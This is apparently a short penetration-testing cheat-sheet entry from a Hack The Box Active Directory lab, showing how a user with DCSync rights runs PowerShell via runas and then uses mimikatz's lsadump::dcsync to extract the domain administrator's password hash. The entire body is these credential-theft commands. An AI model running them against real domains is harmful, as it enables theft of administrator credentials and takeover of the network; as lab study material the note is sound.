# Mimikatz DCSync: Extract Administrator Hash

OS: Active_Directory, Windows
Description: mimikatz DCSync: Extract Administrator Hash
Security Domains: Credential Access (https://www.notion.so/Credential-Access-1444c8e523768003b6fde866419041dc?pvs=21)
Target_Technology: PowerView (https://www.notion.so/PowerView-1454c8e523768011a934c27c986b7ef4?pvs=21), PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21), mimikatz (https://www.notion.so/mimikatz-1464c8e5237680df8de9d1588f8d4980?pvs=21)

### From htb-student using adunn (with dcsync) we could:

```jsx
runas /netonly /user:TargetDomain\adunn powershell
```

```jsx
.\mimikatz.exe
privilege::debug
 lsadump::dcsync /domain:Targetdomain.LOCAL /user:TargetDomain\administrator
```